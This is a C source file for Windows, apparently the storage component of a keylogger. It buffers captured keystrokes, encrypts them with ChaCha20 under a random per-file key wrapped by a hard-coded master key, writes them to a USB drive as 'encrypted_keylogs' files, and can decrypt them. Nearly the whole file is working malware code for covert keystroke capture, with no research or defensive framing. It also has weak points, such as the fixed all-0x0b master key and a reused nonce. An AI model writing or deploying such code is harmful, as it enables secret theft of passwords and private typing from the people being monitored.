#include "key_logger_storage.h"
#include "encryption.h"
#include "utils.h"
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

#define MAX_BUFFER_SIZE 4096
#define FLUSH_INTERVAL 60
#define MASTER_KEY_SIZE 32

// MATSTER KEY IS TEMPORLILY HARD CODED

static const uint8_t MASTER_KEY[MASTER_KEY_SIZE] = {
    0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b,
    0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b,
    0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b,
    0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b, 0x0b
};

struct KeyLoggerStorage {
    char buffer[MAX_BUFFER_SIZE];
    size_t buffer_pos;
    time_t last_flush_time;
};

static bool generate_random_bytes(uint8_t* buffer, size_t length) {
    HCRYPTPROV hCryptProv;
    bool result = false;

    if (CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        result = CryptGenRandom(hCryptProv, (DWORD)length, buffer);
        CryptReleaseContext(hCryptProv, 0);
    }
    return result;
}

KeyLoggerStorage* key_logger_storage_create(void) {
    KeyLoggerStorage* storage = safe_malloc(sizeof(KeyLoggerStorage));
    if (storage) {
        memset(storage->buffer, 0, MAX_BUFFER_SIZE);
        storage->buffer_pos = 0;
        storage->last_flush_time = time(NULL);
    }
    return storage;
}

void key_logger_storage_destroy(KeyLoggerStorage* storage) {
    if (storage) {
        memset(storage->buffer, 0, MAX_BUFFER_SIZE);
        safe_free(storage);
    }
}

bool key_logger_storage_add_key(KeyLoggerStorage* storage, const char* key) {
    if (!storage || !key) return false;

    size_t key_len = strlen(key);
    if (storage->buffer_pos + key_len >= MAX_BUFFER_SIZE) {
        return false;
    }

    strncpy(storage->buffer + storage->buffer_pos, key, MAX_BUFFER_SIZE - storage->buffer_pos);
    storage->buffer_pos += key_len;

    time_t current_time = time(NULL);
    if (current_time - storage->last_flush_time >= FLUSH_INTERVAL) {
        storage->last_flush_time = current_time;
    }

    return true;
}

bool key_logger_storage_encrypt_and_save_to_usb(KeyLoggerStorage* storage, const char* usb_path) {
    if (!storage || !usb_path) return false;

    uint8_t key[CHACHA20_KEY_SIZE];
    uint8_t nonce[CHACHA20_NONCE_SIZE];
    
    if (!generate_random_bytes(key, CHACHA20_KEY_SIZE) || 
        !generate_random_bytes(nonce, CHACHA20_NONCE_SIZE)) {
        return false;
    }

    ChaCha20_ctx ctx;
    chacha20_init(&ctx, key, nonce);
    uint8_t* encrypted_buffer = safe_malloc(storage->buffer_pos);
    if (!encrypted_buffer) {
        return false;
    }

    chacha20_encrypt(&ctx, (uint8_t*)storage->buffer, encrypted_buffer, storage->buffer_pos);

    uint8_t encrypted_key[CHACHA20_KEY_SIZE];
    ChaCha20_ctx master_ctx;
    chacha20_init(&master_ctx, MASTER_KEY, nonce);
    chacha20_encrypt(&master_ctx, key, encrypted_key, CHACHA20_KEY_SIZE);

    char filepath[MAX_PATH];
    if (snprintf(filepath, sizeof(filepath), "%s\\encrypted_keylogs_%lu.bin", usb_path, (unsigned long)time(NULL)) < 0) {
        safe_free(encrypted_buffer);
        return false;
    }

    FILE* file = fopen(filepath, "wb");
    if (!file) {
        safe_free(encrypted_buffer);
        return false;
    }

    bool success = (fwrite(nonce, 1, CHACHA20_NONCE_SIZE, file) == CHACHA20_NONCE_SIZE) &&
                   (fwrite(encrypted_key, 1, CHACHA20_KEY_SIZE, file) == CHACHA20_KEY_SIZE) &&
                   (fwrite(encrypted_buffer, 1, storage->buffer_pos, file) == storage->buffer_pos);

    fclose(file);
    safe_free(encrypted_buffer);

    if (!success) {
        return false;
    }

    memset(key, 0, CHACHA20_KEY_SIZE);

    return true;
}

bool key_logger_storage_decrypt_from_usb(const char* filepath, char** decrypted_data, size_t* data_size) {
    FILE* file = fopen(filepath, "rb");
    if (!file) return false;

    uint8_t nonce[CHACHA20_NONCE_SIZE];
    uint8_t encrypted_key[CHACHA20_KEY_SIZE];
    
    if (fread(nonce, 1, CHACHA20_NONCE_SIZE, file) != CHACHA20_NONCE_SIZE ||
        fread(encrypted_key, 1, CHACHA20_KEY_SIZE, file) != CHACHA20_KEY_SIZE) {
        fclose(file);
        return false;
    }

    uint8_t key[CHACHA20_KEY_SIZE];
    ChaCha20_ctx master_ctx;
    chacha20_init(&master_ctx, MASTER_KEY, nonce);
    chacha20_decrypt(&master_ctx, encrypted_key, key, CHACHA20_KEY_SIZE);

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file) - CHACHA20_NONCE_SIZE - CHACHA20_KEY_SIZE;
    fseek(file, CHACHA20_NONCE_SIZE + CHACHA20_KEY_SIZE, SEEK_SET);

    uint8_t* encrypted_data = safe_malloc(file_size);
    if (!encrypted_data) {
        fclose(file);
        return false;
    }

    if (fread(encrypted_data, 1, file_size, file) != file_size) {
        fclose(file);
        safe_free(encrypted_data);
        return false;
    }

    fclose(file);

    *decrypted_data = safe_malloc(file_size);
    if (!*decrypted_data) {
        safe_free(encrypted_data);
        return false;
    }

    ChaCha20_ctx ctx;
    chacha20_init(&ctx, key, nonce);
    chacha20_decrypt(&ctx, encrypted_data, (uint8_t*)*decrypted_data, file_size);

    safe_free(encrypted_data);
    *data_size = file_size;

    return true;
}